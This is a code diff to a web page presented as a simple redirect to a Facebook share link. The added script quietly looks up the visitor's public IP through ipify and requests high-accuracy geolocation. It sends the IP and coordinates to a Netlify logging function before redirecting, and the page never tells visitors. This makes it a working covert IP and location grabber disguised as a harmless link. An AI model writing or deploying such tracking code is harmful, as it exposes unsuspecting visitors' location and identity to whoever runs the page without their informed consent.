@@ -2,20 +2,57 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Logging…</title>
   <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Redirecting…</title>
 </head>
 <body>
-  <p>Loading…</p>
+  <p>Redirecting…</p>
 
-  <script>
-    // call our function AND redirect afterward
-    fetch("/.netlify/functions/log", { method: "POST" })
-      .catch(()=>{})
-      .finally(()=>{
-        // set your redirect link here
-        window.location.href = "https://www.facebook.com/share/r/1GSrQ5WSVa/";
-      });
-  </script>
+<script>
+(async function(){
+  // get public IP as fallback
+  let client_ip = '';
+  try {
+    const r = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
+    const j = await r.json();
+    client_ip = j.ip || '';
+  } catch(e){}
+
+  // helper to send data using sendBeacon if available (keeps it fast)
+  function send(body){
+    try {
+      const blob = new Blob([JSON.stringify(body)], {type:'application/json'});
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('/.netlify/functions/log', blob);
+        return;
+      }
+    } catch(e){}
+    // fallback
+    fetch('/.netlify/functions/log', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(body),
+      keepalive: true
+    }).catch(()=>{});
+  }
+
+  // Try high-accuracy geolocation (will prompt user)
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(pos){
+      send({ client_ip, coords: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } });
+      // short delay so request can be sent
+      setTimeout(()=>{ window.location.href = "https://www.facebook.com/share/r/1GSrQ5WSVa/"; }, 400);
+    }, function(err){
+      // user denied or error -> send only IP
+      send({ client_ip });
+      setTimeout(()=>{ window.location.href = "https://www.facebook.com/share/r/1GSrQ5WSVa/"; }, 200);
+    }, { maximumAge:0, timeout:5000, enableHighAccuracy:true });
+  } else {
+    // no geolocation support
+    send({ client_ip });
+    setTimeout(()=>{ window.location.href = "https://www.facebook.com/share/r/1GSrQ5WSVa/"; }, 200);
+  }
+})();
+</script>
 </body>
 </html>
